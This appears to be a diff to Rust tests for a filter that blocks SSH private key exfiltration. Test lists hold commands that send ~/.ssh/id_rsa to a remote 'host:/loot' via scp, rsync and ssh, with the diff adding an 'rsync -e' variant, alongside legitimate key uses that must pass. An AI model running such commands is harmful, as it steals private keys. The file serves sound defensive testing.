@@ -48,6 +48,7 @@ fn the_identity_named_again_is_read() {
         "nice scp -i ~/.ssh/id_rsa ~/.ssh/id_rsa host:/loot",
         "sshpass -p x scp -i ~/.ssh/id_rsa ~/.ssh/id_rsa host:/loot",
         "rsync -avz --rsh=\"ssh -i ~/.ssh/id_rsa\" ~/.ssh/id_rsa host:/loot",
+        "rsync -e \"ssh -i ~/.ssh/id_rsa\" ~/.ssh/id_rsa host:/loot",
         "ssh host -i ~/.ssh/id_rsa cat ~/.ssh/id_rsa",
         "scp -i ~/.ssh/id_rsa notes.txt host:/srv/ < ~/.ssh/id_rsa",
         "ssh -i ~/.ssh/id_rsa host 'cat > /tmp/k' < ~/.ssh/id_rsa",
@@ -236,6 +237,9 @@ fn key_use_is_not_refused() {
         // rsync's long transport option, in one word and in two
         "rsync -avz --rsh=\"ssh -i ~/.ssh/id_rsa\" docs/ host:/srv/docs/",
         "rsync -avz --rsh \"ssh -i ~/.ssh/id_rsa\" docs/ host:/srv/docs/",
+        // and its short one, which ends in the letters of netcat's exec flag
+        "rsync -e \"ssh -i ~/.ssh/id_rsa\" -a docs/ host:/srv/docs/",
+        "rsync -e \"ssh -i ~/.ssh/id_rsa -p 2222\" -a docs/ host:/srv/docs/",
     ]);
 }
 
